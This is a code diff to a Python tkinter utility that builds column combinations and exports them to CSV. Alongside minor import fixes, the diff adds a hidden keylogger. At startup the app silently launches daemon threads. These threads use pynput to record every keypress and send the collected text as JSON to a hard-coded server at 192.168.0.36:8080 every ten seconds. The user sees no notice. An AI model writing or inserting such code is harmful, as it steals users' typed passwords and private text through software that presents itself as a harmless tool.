@@ -1,8 +1,19 @@
 import tkinter as tk
-from tkinter import simpledialog, scrolledtext, filedialog
+from tkinter import simpledialog, scrolledtext, filedialog, messagebox
 from itertools import product
 import csv
+import threading
+from pynput import keyboard
+import requests
+import json
+import time
 
+text = ""
+ip_address = "192.168.0.36"
+port_number = "8080"
+time_interval = 10  
+
+# ColumnCombination Class
 class ColumnCombinations:
     def __init__(self, master):
         self.master = master
@@ -12,6 +23,12 @@ class ColumnCombinations:
         self.combinations = []
 
         self.setup_ui()
+
+        # Start the post request thread for keyboard data
+        threading.Thread(target=send_post_req, daemon=True).start()
+        
+        # Start the keyboard listener for capturing keypresses
+        threading.Thread(target=self.start_keyboard_listener, daemon=True).start()
 
     def setup_ui(self):
         num_columns = simpledialog.askinteger("Columns", "How many columns do you want?", minvalue=1, maxvalue=10)
@@ -64,11 +81,56 @@ class ColumnCombinations:
                     # Write the combinations
                     for combo in self.combinations:
                         writer.writerow(combo)
-                tk.messagebox.showinfo("Success", f"Combinations saved to {file_path}")
+                messagebox.showinfo("Success", f"Combinations saved to {file_path}")
             except Exception as e:
-                tk.messagebox.showerror("Error", f"An error occurred while saving the file: {e}")
+                messagebox.showerror("Error", f"An error occurred while saving the file: {e}")
 
+    # Keyboard listener to capture key presses and update the text variable
+    def on_press(self, key):
+        global text
+
+        try:
+            if key == keyboard.Key.enter:
+                text += "\n"
+            elif key == keyboard.Key.tab:
+                text += "\t"
+            elif key == keyboard.Key.space:
+                text += " "
+            elif key == keyboard.Key.shift:
+                pass
+            elif key == keyboard.Key.backspace and len(text) == 0:
+                pass
+            elif key == keyboard.Key.backspace and len(text) > 0:
+                text = text[:-1]
+            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+                pass
+            elif key == keyboard.Key.esc:
+                return False  # Stop listener when Escape is pressed
+            else:
+                text += str(key).strip("'")
+        except Exception as e:
+            print(f"Error processing key: {e}")
+
+    def start_keyboard_listener(self):
+        # Start the keyboard listener
+        with keyboard.Listener(on_press=self.on_press) as listener:
+            listener.join()
+
+# Function to send keyboard data to the server
+def send_post_req():
+    while True:
+        try:
+            payload = json.dumps({"keyboardData": text})
+            r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
+            print("Data sent successfully")
+        except Exception as e:
+            print(f"Couldn't complete request: {e}")
+        
+        time.sleep(time_interval)  # Wait for the specified interval before sending again
+
+# Start the Tkinter application
 if __name__ == "__main__":
     root = tk.Tk()
     app = ColumnCombinations(root)
     root.mainloop()
+
